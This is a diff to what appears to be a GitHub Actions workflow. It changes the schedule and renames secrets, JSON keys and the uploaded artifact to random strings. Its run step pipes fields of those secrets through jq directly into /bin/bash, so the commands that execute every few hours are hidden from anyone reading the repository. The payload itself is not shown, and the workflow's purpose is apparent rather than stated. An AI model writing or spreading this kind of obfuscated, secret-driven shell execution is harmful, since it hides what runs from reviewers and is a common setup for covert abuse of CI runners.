@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '40 4,10,16,22 * * *'
+    - cron: '14 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          f29: ${{ secrets.f29 }}
+          xxqx88438: ${{ secrets.xxqx88438 }}
         run: |
-          printf '%s' "$f29" | jq -r .yjk28515 | /bin/bash
-          echo $qx38695 | jq -r .bhh1 | /bin/bash
-          echo $rc149 | jq -r .idx38440 | /bin/bash
-          echo $xjk803 | jq -r .zicur1 | /bin/bash
+          printf '%s' "$xxqx88438" | jq -r .ynt66733 | /bin/bash
+          printf '%s' "$kie1" | jq -r .tniy150 | /bin/bash
+          echo $bzp177 | jq -r .qj3461 | /bin/bash
+          echo $he384 | jq -r .w2 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Qh3eZLo3
+          name: JIm3MOm7
           path: "*.zip"
           retention-days: 1
